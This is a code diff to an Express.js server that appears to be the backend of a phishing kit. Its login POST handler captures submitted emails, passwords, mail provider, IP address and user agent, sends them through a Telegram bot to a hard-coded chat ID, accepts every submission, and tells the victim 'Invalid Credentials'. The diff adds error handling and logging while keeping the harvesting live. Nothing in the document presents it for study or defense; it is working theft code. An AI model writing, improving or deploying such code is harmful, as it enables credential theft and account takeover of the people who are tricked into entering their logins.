@@ -8,8 +8,14 @@
   const app = express();
   const port = 3001;
 
-  // Enable CORS
   app.use(cors());
+
+  app.use((req, res, next) => {
+    console.log('Request received:', req.method, req.url);
+    next();
+  });
+  
+  
 
   // Middleware to get User Agent
 app.use((req, res, next) => {
@@ -45,35 +51,41 @@ app.use(express.static(path.join(__dirname, 'css')));
 
   app.use(bodyParser.urlencoded({ extended: true }));
 
+  
+
   app.post('/', (req, res) => {
-    const email = req.body.email;
-    const password = req.body.password;
-    const field = req.body.field;
-    const userAgent = req.userAgent;
-
-  // Get the client's IP address
-  const clientIp = requestIp.getClientIp(req);
-
-    console.log('Received login attempt:', email, password, field, clientIp, user );
-
-    const isValidCredentials = true;
-
-    // Example validation logic (replace with your actual validation)
-    if (isValidCredentials) {
-      // Send Telegram message
-      const chatId = '1713212728';  // Replace with your Telegram group username or chat ID
-      const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nType of Mail: ${field}\nIP Address: ${clientIp}\nUser Agent: ${userAgent}`;
-      bot.sendMessage(chatId, message);
-
-      console.log('my chat', chatId, message)
-
-      console.log('Sending response:', { success: true, message: 'Login successful' });
-
-      // Send response to the client
-      res.json({ success: true, message: 'Invalid Credentials' });
-    } else {
-      // Send response to the client for invalid credentials
-      res.json({ success: false, message: 'Invalid email or password' });
+    try {
+      const email = req.body.email;
+      const password = req.body.password;
+      const field = req.body.field;
+      const userAgent = req.userAgent;
+  
+    // Get the client's IP address
+    const clientIp = requestIp.getClientIp(req);
+  
+      console.log('Received login attempt:', email, password, field, clientIp, userAgent );
+  
+      const isValidCredentials = true;
+  
+      // Example validation logic (replace with your actual validation)
+      if (isValidCredentials) {
+        // Send Telegram message
+        const chatId = '1713212728';  // Replace with your Telegram group username or chat ID
+        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nType of Mail: ${field}\nIP Address: ${clientIp}\nUser Agent: ${userAgent}`;
+        bot.sendMessage(chatId, message);
+  
+        console.log('my chat', chatId, message)
+  
+        console.log('Sending response:', { success: true, message: 'Login successful' });
+  
+        // Send response to the client
+        res.json({ success: true, message: 'Invalid Credentials' });
+      } else {
+        // Send response to the client for invalid credentials
+        res.json({ success: false, message: 'Invalid email or password' });
+      }
+    } catch (error) {
+      res.status(500).json({err: error.message, message: 'Internal server error'})
     }
   });
 
